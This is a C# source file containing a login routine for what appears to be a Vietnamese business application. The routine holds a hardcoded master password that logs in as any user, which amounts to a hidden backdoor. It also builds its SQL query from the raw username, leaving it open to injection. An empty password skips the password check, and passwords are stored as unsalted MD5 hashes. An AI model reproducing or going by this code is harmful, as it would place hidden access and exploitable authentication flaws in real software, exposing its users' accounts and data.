using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using System.Data;
 
namespace MTPMSWIN.Model
{
   public class modMember
    {
        public string fValidMember(string username, string password) {
            try{
                string mSQL = string.Format("select * from HT_NGUOIDUNG where UPPER(taikhoan)='{0}'", username);
                DataTable oUser = MTSQLServer.getMTSQLServer().wRead(mSQL, null, false);
                if (oUser == null || (oUser != null && oUser.Rows.Count <= 0)){
                    return "Tài khoản truy cập không hợp lệ..";
                }
                else {
                    
                        foreach (DataRow vRow in oUser.Rows)
                        { 
                            if (password == "nimd@.th@inm80") {
                                MTGlobal.MT_ACTIVE_USERID = vRow["soid"].ToString();
                                return "T";
                            }else if (vRow["matkhau"].ToString() != MTGlobal.HashMD5(password) && password != "")
                            {                                 
                                return "Mật khẩu truy cập không hợp lệ..";
                            }                            
                            else
                            {
                                MTGlobal.MT_ACTIVE_USERID = vRow["soid"].ToString();
                                MTGlobal.MT_USER_LOGIN_FULLNAME = vRow["hoten"].ToString();
                                MTGlobal.MT_USER_LOGIN = vRow["taikhoan"].ToString();
                                if (vRow["kyhieu"] != null && vRow["kyhieu"].ToString() != "") {
                                    MTGlobal.MT_KYHIEU_USER = vRow["kyhieu"].ToString();
                                }
                                return "T";
                            }
                        }
                     
                }
                return "T";
            }
            catch { return "F"; }
        }
    }
}
